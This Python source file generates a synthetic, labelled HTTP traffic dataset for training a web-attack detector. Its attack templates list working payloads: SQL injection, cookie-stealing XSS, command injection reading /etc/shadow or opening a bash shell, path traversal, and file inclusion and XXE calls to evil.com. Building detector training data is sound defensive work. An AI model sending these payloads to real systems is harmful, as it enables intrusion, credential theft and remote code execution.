import random
import pandas as pd
import numpy as np
from typing import List, Dict, Tuple

class DatasetGenerator:
    """
    Synthesizes high-fidelity HTTP request datasets modeled after CSIC 2010
    and HTTP Parameter attack distributions across normal traffic and 11 attack families.
    """
    NORMAL_URLS = [
        "/index.html", "/home", "/products?id=102&category=electronics",
        "/about-us", "/contact", "/api/v1/user/profile?uid=9482",
        "/cart/view", "/checkout?step=billing", "/blog/post?slug=waf-security",
        "/login", "/search?q=wireless+headphones"
    ]

    NORMAL_PAYLOADS = [
        "", "username=john.doe&remember=true", "search=keyboard",
        "page=2&sort=price_asc", "email=user@example.com&newsletter=1",
        "comment=Great+product+thanks!", "quantity=2&product_id=405"
    ]

    ATTACK_TEMPLATES: Dict[str, List[str]] = {
        "SQL Injection": [
            "/products?id=102' OR '1'='1",
            "/login?user=admin'--&pass=123",
            "/search?q=1 UNION SELECT 1,username,password FROM users--",
            "/api/v1/user?id=1; WAITFOR DELAY '0:0:5'--",
            "/items?cat=1/*!50000UNION*/+SELECT+1,@@version--"
        ],
        "XSS": [
            "/search?q=<script>alert(document.cookie)</script>",
            "/comment?body=<img src=x onerror=alert(1)>",
            "/profile?name=<svg/onload=alert('XSS')>",
            "/post?title=javascript:alert(1)",
            "/view?ref=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
        ],
        "Command Injection": [
            "/ping?host=127.0.0.1; cat /etc/passwd",
            "/download?file=doc.pdf | whoami",
            "/status?ip=`id`",
            "/log?path=test; /bin/bash -i",
            "/exec?cmd=$(cat /etc/shadow)"
        ],
        "Path Traversal": [
            "/download?file=../../../../etc/passwd",
            "/view?template=..%2f..%2f..%2fwindows%2fsystem32%2fconfig%2fsam",
            "/static?path=/var/www/../../etc/shadow",
            "/include?page=../../../../boot.ini"
        ],
        "File Inclusion": [
            "/page?file=php://filter/read=convert.base64-encode/resource=index.php",
            "/load?module=http://evil.com/shell.txt",
            "/render?tpl=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
        ],
        "XXE": [
            "/api/xml?payload=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "/soap?body=<!ENTITY % x SYSTEM 'http://evil.com/x.dtd'>%x;"
        ],
        "SSTI": [
            "/greet?name={{7*7}}",
            "/template?code=${7*7}",
            "/render?param=<%= 7*7 %>",
            "/user?profile={{''.__class__.__mro__[1].__subclasses__()}}"
        ],
        "HTTP Parameter Pollution": [
            "/transfer?amount=10&account=123&amount=10000",
            "/role?user=john&admin=false&admin=true"
        ],
        "Encoded Attacks": [
            "/search?q=%27%20%55%4E%49%4F%4E%20%53%45%4C%45%43%54%20%31%2C%32%2D%2D",
            "/login?u=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
        ],
        "Obfuscated Attacks": [
            "/query?sql=SEL/**/ECT/**/user/**/FR/**/OM/**/admin",
            "/js?code=eval(String.fromCharCode(97,108,101,114,116,40,49,41))"
        ]
    }

    @classmethod
    def generate_dataset(cls, num_samples: int = 2000) -> pd.DataFrame:
        """
        Generates a balanced dataset of normal (50%) and attack (50%) traffic samples.
        Returns DataFrame with columns: ['url', 'payload', 'label', 'attack_category']
        """
        data = []
        num_normal = num_samples // 2
        num_attacks = num_samples - num_normal

        # Generate Normal traffic (label = 0)
        for _ in range(num_normal):
            url = random.choice(cls.NORMAL_URLS)
            payload = random.choice(cls.NORMAL_PAYLOADS)
            data.append({
                "url": url,
                "payload": payload,
                "label": 0,
                "attack_category": "Legitimate"
            })

        # Generate Attack traffic (label = 1) across categories
        attack_cats = list(cls.ATTACK_TEMPLATES.keys())
        for _ in range(num_attacks):
            cat = random.choice(attack_cats)
            url_payload = random.choice(cls.ATTACK_TEMPLATES[cat])
            # Split into url and payload if query param exists
            if "?" in url_payload:
                parts = url_payload.split("?", 1)
                url = parts[0]
                payload = parts[1]
            else:
                url = url_payload
                payload = ""
            data.append({
                "url": url,
                "payload": payload,
                "label": 1,
                "attack_category": cat
            })

        df = pd.DataFrame(data)
        return df.sample(frac=1.0, random_state=42).reset_index(drop=True)
